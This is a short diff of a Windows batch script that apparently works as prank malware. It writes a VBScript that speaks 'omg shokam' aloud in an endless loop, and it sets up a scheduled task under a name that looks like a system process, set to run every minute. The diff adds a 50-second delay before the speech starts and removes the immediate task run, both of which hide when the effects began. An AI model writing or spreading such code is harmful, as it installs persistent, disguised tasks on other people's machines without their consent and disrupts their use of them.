@@ -41,6 +41,7 @@ goto :MAIN
 
     type nul > "%ttsfile%"
     echo set voice = createobject("sapi.spvoice") >> "%ttsfile%"
+    echo wscript.sleep(50000) >> "%ttsfile%"
     echo do while 1 >> "%ttsfile%"
     echo    voice.speak "omg shokam" >> "%ttsfile%"
     echo    wscript.sleep(2000) >> "%ttsfile%" 
@@ -75,7 +76,6 @@ goto :MAIN
 
     schtasks /create /tn "%schhost%" /tr "%driverfile%" /sc minute /mo 1 /st 00:00:00 /f
     powershell -command %tasksettings%"Set-ScheduledTask -TaskName %schhost% -Settings $TaskSettings"
-    schtasks /run /tn "%schhost%"
 
     start wscript.exe "%ttsfile%"
     exit
